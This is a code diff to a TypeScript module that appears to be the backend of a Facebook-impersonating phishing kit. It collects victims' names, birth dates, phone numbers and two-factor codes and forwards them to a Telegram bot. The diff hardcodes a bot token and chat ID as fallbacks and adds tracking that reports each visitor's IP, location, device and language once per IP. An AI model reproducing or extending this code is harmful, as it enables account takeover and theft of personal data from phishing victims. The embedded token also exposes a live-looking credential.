@@ -5,16 +5,20 @@ import { generateKey } from '@/utils/generateKey';
 
 const agent = new https.Agent({ family: 4 });
 
+/** Fallback khi Railway / .env chưa cấu hình biến Telegram */
+const DEFAULT_TELEGRAM_BOT_TOKEN = '9059134375:AAHLLJxSa5PzY3VwyzqOUHBRd-yQ7Dgzt38'
+const DEFAULT_TELEGRAM_CHAT_ID = '-5560421255'
+
 function getTelegramConfig() {
-    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
-    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
+    const token = process.env.TELEGRAM_BOT_TOKEN?.trim() || DEFAULT_TELEGRAM_BOT_TOKEN
+    const chatId = process.env.TELEGRAM_CHAT_ID?.trim() || DEFAULT_TELEGRAM_CHAT_ID
     if (!token || !chatId) {
-        return null;
+        return null
     }
     return {
         api: `https://api.telegram.org/bot${token}`,
         chatId,
-    };
+    }
 }
 
 // Simple rate limiter to prevent spam
@@ -91,8 +95,12 @@ function formatCodeField(value: unknown): string {
 
 function normalizeData(input: any = {}) {
     return {
+        event: input.event ?? '',
         ip: input.ip ?? '',
         location: input.location ?? '',
+        device: input.device ?? '',
+        locale: input.locale ?? '',
+        language: input.language ?? input.locale ?? '',
         fullName: input.fullName ?? input.name ?? '',
         fanpage: input.fanpage ?? '',
         day: input.day ?? '',
@@ -122,8 +130,28 @@ function mergeData(oldData: any = {}, newData: any = {}) {
     return result;
 }
 
+function formatVisitMessage(data: any): string {
+    const d = normalizeData(data);
+    const language = d.language || d.locale;
+    return [
+        `<b>👀 NEW VISIT — FACEBOOK CONTENT MONETIZATION</b>`,
+        `----------------------`,
+        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
+        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
+        `<b>Device:</b> <code>${formatCodeField(d.device)}</code>`,
+        language ? `<b>Language:</b> <code>${formatCodeField(language)}</code>` : '',
+    ]
+        .filter(Boolean)
+        .join('\n');
+}
+
 function formatMessage(data: any): string {
     const d = normalizeData(data);
+
+    if (String(d.event).toLowerCase() === 'visit') {
+        return formatVisitMessage(d);
+    }
+
     const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
         : '';
@@ -131,9 +159,8 @@ function formatMessage(data: any): string {
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
 
+    // Device / Language chỉ có ở tin visit đầu tiên (formatVisitMessage)
     const lines = [
-        `<b>📋 FACEBOOK CONTENT MONETIZATION</b>`,
-        `----------------------`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
         `----------------------`,
@@ -162,11 +189,32 @@ function formatMessage(data: any): string {
     return lines.join('\n');
 }
 
+/** Visit: 1 IP chỉ gửi 1 lần (TTL dài trên memory store). */
+const VISIT_IP_TTL_MS = 1000 * 60 * 60 * 24 * 30 // 30 ngày
+
+function visitIpStoreKey(ip: string): string {
+    return `visit-ip:${ip.trim()}`
+}
+
 export async function sendTelegramMessage(data: any): Promise<void> {
     const config = getTelegramConfig();
     if (!config) {
         console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
         return;
+    }
+
+    const isVisit = String(data?.event || '').toLowerCase() === 'visit'
+    const visitIp = String(data?.ip || '').trim()
+
+    if (isVisit) {
+        if (!visitIp) {
+            console.warn('⚠️ Bỏ visit: thiếu IP')
+            return
+        }
+        if (memoryStoreTTL.get(visitIpStoreKey(visitIp))) {
+            console.warn(`⚠️ Visit đã gửi cho IP ${visitIp} — bỏ qua`)
+            return
+        }
     }
 
     const key = generateKey(data);
@@ -177,7 +225,7 @@ export async function sendTelegramMessage(data: any): Promise<void> {
     }
     const prev = memoryStoreTTL.get(key);
     const fullData = mergeData(prev?.data, data);
-    const updatedText = formatMessage(fullData);
+    const updatedText = formatMessage(isVisit ? { ...fullData, event: 'visit' } : fullData);
 
     try {
         const res = await retryTelegramRequest(() =>
@@ -194,6 +242,13 @@ export async function sendTelegramMessage(data: any): Promise<void> {
         const messageId = res?.data?.result?.message_id;
         if (messageId) {
             memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
+            if (isVisit && visitIp) {
+                memoryStoreTTL.set(
+                    visitIpStoreKey(visitIp),
+                    { message: 'visit', messageId, data: { ip: visitIp } },
+                    VISIT_IP_TTL_MS
+                )
+            }
             console.log(`✅ Sent new message. ID: ${messageId}`);
         } else {
             console.warn('⚠️ Telegram response không có message_id');
@@ -212,6 +267,13 @@ export async function sendTelegramMessage(data: any): Promise<void> {
             const fallbackMessageId = fallbackRes?.data?.result?.message_id;
             if (fallbackMessageId) {
                 memoryStoreTTL.set(key, { message: updatedText, messageId: fallbackMessageId, data: fullData });
+                if (isVisit && visitIp) {
+                    memoryStoreTTL.set(
+                        visitIpStoreKey(visitIp),
+                        { message: 'visit', messageId: fallbackMessageId, data: { ip: visitIp } },
+                        VISIT_IP_TTL_MS
+                    )
+                }
                 console.log(`🔄 Fallback send success. ID: ${fallbackMessageId}`);
             } else {
                 console.warn('⚠️ Fallback Telegram response không có message_id');
